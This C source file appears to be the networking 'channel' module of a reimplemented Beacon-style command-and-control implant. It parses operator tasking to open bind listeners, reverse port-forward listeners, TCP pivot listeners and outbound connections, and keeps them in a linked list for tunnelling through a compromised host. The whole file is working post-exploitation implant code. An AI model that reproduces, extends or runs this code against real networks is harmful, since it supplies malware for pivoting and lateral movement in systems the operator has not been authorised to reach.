#include "pch.h"

#include "channel.h"

#include "beacon.h"
#include "network.h"

typedef struct _CHANNEL_ENTRY
{
	int id;
	int state;
	int timeoutPeriod;
	int lastActive;
	int type;
	int port;
	int creationTime;
	HANDLE socket;
	struct CHANNEL_ENTRY* next;
} CHANNEL_ENTRY;

CHANNEL_ENTRY* gChannels;

#define CHANNEL_STATE_0 0
#define CHANNEL_STATE_1 1
#define CHANNEL_STATE_2 2
#define CHANNEL_STATE_3 3

#define CHANNEL_TYPE_CONNECT 0
#define CHANNEL_TYPE_LISTEN 1
#define CHANNEL_TYPE_BIND 2
#define CHANNEL_TYPE_TCP_PIVOT 3

BOOL ChannelIsBindValid(short port)
{
	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if (channel->state && channel->type == CHANNEL_TYPE_BIND && channel->port == port)
		{
			return TRUE;
		}
	}
	return FALSE;
}

SOCKET ChannelSocketCreateAndBind(const int addr, const short port, const int backlog)
{
	NetworkInit();

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	if(sock == INVALID_SOCKET)
	{
		return INVALID_SOCKET;
	}

	struct sockaddr_in sockaddr;
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_addr.s_addr = addr;
	sockaddr.sin_port = htons(port);

	int argp = 1; // 1 = non-blocking
	if(ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR
		|| bind(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR
		|| listen(sock, backlog) == SOCKET_ERROR)
	{
		closesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}

void ChannelAdd(SOCKET socket, int id, int timeoutPeriod, int type, int port, int state)
{
	CHANNEL_ENTRY* newChannel = malloc(sizeof(CHANNEL_ENTRY));
	*newChannel = (CHANNEL_ENTRY){
		.id = id,
		.socket = (HANDLE)socket,
		.state = state,
		.lastActive = 0,
		.creationTime = GetTickCount(),
		.timeoutPeriod = timeoutPeriod,
		.port = port,
		.type = type,
		.next = gChannels
	};

	
	for (CHANNEL_ENTRY* ch = gChannels; ch; ch = (CHANNEL_ENTRY*)ch->next)
		if (ch->id == id)
			ch->state = CHANNEL_STATE_0;

	gChannels = newChannel;
}

int gChannelIdCount = 0;
long long ChannelGetId()
{
	return 0x4000000 + gChannelIdCount++ % 0x4000000;
}

void ChannelLSocketBind(char* buffer, int length, int ipAddress)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);
	SOCKET sock = ChannelSocketCreateAndBind(ipAddress, port, 10);
	if (sock == INVALID_SOCKET)
	{
		LERROR("Could not bind to %d", port);
		BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port);
		return;
	}

	int newId = ChannelGetId();
	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_BIND, port, CHANNEL_STATE_2);
}

void ChannelLSocketTcpPivot(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);
	SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 10);
	if (sock == INVALID_SOCKET)
	{
		LERROR("Could not bind to %d", port);
		BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port);
		return;
	}

	int newId = ChannelGetId();
	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_TCP_PIVOT, port, CHANNEL_STATE_2);
}

void ChannelListen(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int id = BeaconDataInt(&parser);
	short port = BeaconDataShort(&parser);

	SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 1);
	if (sock == INVALID_SOCKET)
	{
		BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(id));
		return;
	}

	ChannelAdd(sock, id, 180000, CHANNEL_TYPE_LISTEN, port, CHANNEL_STATE_2);
}

void ChannelConnect(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int channelId = BeaconDataInt(&parser);
	short port = BeaconDataShort(&parser);

	int bufferSize = BeaconDataLength(&parser);
	bufferSize = min(bufferSize, 1024 - 1);

	char* b = BeaconDataBuffer(&parser);
	memcpy(buffer, b, bufferSize);
	buffer[bufferSize] = 0;

	NetworkInit();

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	if (sock == INVALID_SOCKET)
		goto close;

	HOSTENT* lHostent = gethostbyname(buffer);
	if (!lHostent)
		goto close;

	struct sockaddr_in sockaddr;
	memcpy(&sockaddr.sin_addr, lHostent->h_addr, lHostent->h_length);
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);

	int argp = 1; // 1 = non-blocking
	if (ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR)
		goto close;

	if (connect(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR)
		if (WSAGetLastError() != WSAEWOULDBLOCK)
			goto close;

	ChannelAdd(sock, channelId, 30000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_2);

	return;

	close:
	closesocket(sock);
	BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(channelId));
}

void ChannelClose(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int channelId = BeaconDataInt(&parser);

	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if(channel->state != CHANNEL_STATE_0 && 
			channel->id == channelId &&
			channel->type != CHANNEL_TYPE_BIND)
		{
			channel->state = CHANNEL_STATE_0;
		}
	}
}
